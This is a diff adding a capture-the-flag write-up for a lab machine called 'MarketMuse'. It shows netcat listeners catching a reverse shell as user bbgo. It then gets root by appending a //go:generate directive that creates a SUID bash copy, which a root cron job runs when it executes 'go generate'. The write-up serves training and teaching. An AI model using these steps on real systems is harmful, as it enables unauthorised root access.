@@ -1,8 +1,8 @@
-# [Machine Name]
+# MarketMuse
 
 ## Introduction
 
-[Include why you made this box, what skills and vulnerabilities you wanted to highlight, etc]
+MarketMuse is a box that highlight custom webapp exploitation and custom script execution. It also rewards trial and error and enumeration.
 
 ## Info for HTB
 
@@ -203,15 +203,191 @@ In the collection "sessions" however, we can try the same syntax and the yaml wo
 
 And I receive a call on my kali
 
+```bash
+nc -lvnp 4444
+````
+````
+listening on [any] 4444 ...
+connect to [192.168.50.139] from (UNKNOWN) [192.168.50.158] 58094
+GET / HTTP/1.1
+Host: 192.168.50.139:4444
+User-Agent: curl/8.5.0
+Accept: */*
+````
 
+Great, with this, we can try a payload and see if we can get a shell.
 
+![hello](assets/captura18.png)
 
-
-
-# Lateral Movement (optional)
-
-[Describe the steps for lateral movement. This can include Docker breakouts / escape-to-host, etc.]
+```bash
+nc -lvnp 9001
+````
+````
+listening on [any] 9001 ...
+connect to [192.168.50.139] from (UNKNOWN) [192.168.50.158] 51610
+bash: cannot set terminal process group (112867): Inappropriate ioctl for device
+bash: no job control in this shell
+bbgo@dev:/opt/marketmuse/app$ whoami
+whoami
+bbgo
+bbgo@dev:/opt/marketmuse/app$ 
+````
 
 # Privilege Escalation
 
-[Describe the steps to obtaining root/administrator privileges on the box.]
+We're user bbgo now and after spawning a full tty, we can take a look manually at the box.
+
+Inside the directory /opt, there are two subdirectories
+
+```bash
+ls
+````
+````
+marketmuse  trading-engine
+````
+
+marketmuse is the root directory for the webapp. Trading-engine is the internal trading strategy backend with configs, custom-strategies and a bin stored by root.
+
+```bash
+ls -la *
+````
+````
+marketmuse:
+total 24
+drwxr-xr-x 6 bbgo bbgo 4096 Jun  7 16:41 .
+drwxr-xr-x 4 root root 4096 Jun  6 15:28 ..
+drwxr-x--- 4 bbgo bbgo 4096 Jun  7 15:43 app
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  7 17:19 reports
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  7 16:41 studies
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  7 17:19 uploads
+
+trading-engine:
+total 20
+drwxr-xr-x 5 bbgo bbgo 4096 Jun  6 15:28 .
+drwxr-xr-x 4 root root 4096 Jun  6 15:28 ..
+drwxr-xr-x 2 bbgo bbgo 4096 Jun  6 15:28 bin
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  6 15:28 configs
+drwxrwxr-x 4 bbgo bbgo 4096 Jun  6 15:28 custom-strategies
+````
+
+```bash
+bbgo@dev:/opt/trading-engine/bin$ ls -la
+````
+````
+total 1880
+drwxr-xr-x 2 bbgo bbgo    4096 Jun  6 15:28 .
+drwxr-xr-x 5 bbgo bbgo    4096 Jun  6 15:28 ..
+-rwxr-xr-x 1 root root 1916306 Jun  7 17:28 strategy-runner
+````
+
+There isn't much more, so I ran linpeas and it reveals strategy-rebuild as a custom cronjob:
+
+````
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root 4096 Jun  6 15:28 .
+drwxr-xr-x 112 root root 4096 Jun  7 14:14 ..
+-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
+-rw-r--r--   1 root root  102 Feb 10 00:34 .placeholder
+-rw-r--r--   1 root root   54 Jun  7 14:29 strategy-rebuild
+-rw-r--r--   1 root root  396 Feb 10 00:34 sysstat
+````
+
+````
+cat /etc/cron.d/strategy-rebuild
+````
+````
+*/2 * * * * root /usr/local/bin/bbgo-strategy-rebuild
+````
+````
+cat /usr/local/bin/bbgo-strategy-rebuild
+````
+````
+#!/bin/bash
+set -e
+
+WORKDIR="/opt/trading-engine/custom-strategies"
+LOG="/var/log/bbgo/strategy-rebuild.log"
+
+echo "[$(date -u --iso-8601=seconds)] starting custom strategy rebuild" >> "$LOG"
+
+cd "$WORKDIR"
+
+echo "[$(date -u --iso-8601=seconds)] refreshing generated strategy sources" >> "$LOG"
+echo "[$(date -u --iso-8601=seconds)] running go generate ./..." >> "$LOG"
+go generate ./... >> "$LOG" 2>&1 || true
+
+echo "[$(date -u --iso-8601=seconds)] building strategy runner" >> "$LOG"
+go build -o "/opt/trading-engine/bin/strategy-runner" ./cmd/strategy-runner >> "$LOG" 2>&1
+
+chown root:root "/opt/trading-engine/bin/strategy-runner"
+chmod 755 "/opt/trading-engine/bin/strategy-runner"
+
+echo "[$(date -u --iso-8601=seconds)] rebuild complete" >> "$LOG"
+````
+
+The workflow of the script is the following:
+
+- It enters the custom strategies directory
+- It runs go generate ./..., which executes any //go:generate ... directives inside Go source files
+- It compiles the Go strategy runner
+- It saves the binary to /opt/trading-engine/bin/strategy-runner
+- It makes the binary root-owned
+- It logs activity to /var/log/bbgo/strategy-rebuild.log
+
+If we can write a file with a comment //go:generate inside any of the folders of WORKDIR, we can potentially make the cronjob execute a command as root. To do this, I'll do the following:
+
+```bash
+ls -la /opt/trading-engine/custom-strategies/*
+````
+````
+-rwxrwxr-x 1 bbgo bbgo   41 Jun  7 14:29 /opt/trading-engine/custom-strategies/go.mod
+-rwxrwxr-x 1 bbgo bbgo  319 Jun  7 14:29 /opt/trading-engine/custom-strategies/README.md
+
+/opt/trading-engine/custom-strategies/cmd:
+total 12
+drwxrwxr-x 3 bbgo bbgo 4096 Jun  6 15:28 .
+drwxrwxr-x 4 bbgo bbgo 4096 Jun  6 15:28 ..
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  6 15:28 strategy-runner
+
+/opt/trading-engine/custom-strategies/strategies:
+total 16
+drwxrwxr-x 4 bbgo bbgo 4096 Jun  6 15:28 .
+drwxrwxr-x 4 bbgo bbgo 4096 Jun  6 15:28 ..
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  6 15:28 grid
+drwxrwxr-x 2 bbgo bbgo 4096 Jun  6 15:28 supertrend
+bbgo@dev:~$ 
+````
+
+As you can see, we have permissions for /opt/trading-engine/custom-strategies/strategies, I'll place the malicious file in /opt/trading-engine/custom-strategies/strategies/grid.
+
+```bash
+printf '\n//go:generate /bin/bash -c "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"\n' >> grid.go
+````
+
+And after waiting a couple of minutes, we have a suid bash in /tmp
+
+```bash
+ls
+````
+````
+rootbash
+snap-private-tmp
+systemd-private-e132500b48874d5aa63d76e36b4846f1-ModemManager.service-kiAWib
+systemd-private-e132500b48874d5aa63d76e36b4846f1-polkit.service-EfTjcr
+systemd-private-e132500b48874d5aa63d76e36b4846f1-systemd-logind.service-Kh8PHj
+systemd-private-e132500b48874d5aa63d76e36b4846f1-systemd-resolved.service-ZLWxFS
+systemd-private-e132500b48874d5aa63d76e36b4846f1-systemd-timesyncd.service-L4GZHL
+systemd-private-e132500b48874d5aa63d76e36b4846f1-upower.service-5HqW20
+tmux-1001
+vmware-root_745-4290690999
+````
+```bash
+./rootbash -p
+````
+````
+rootbash-5.2# whoami
+root
+rootbash-5.2# 
+````
+
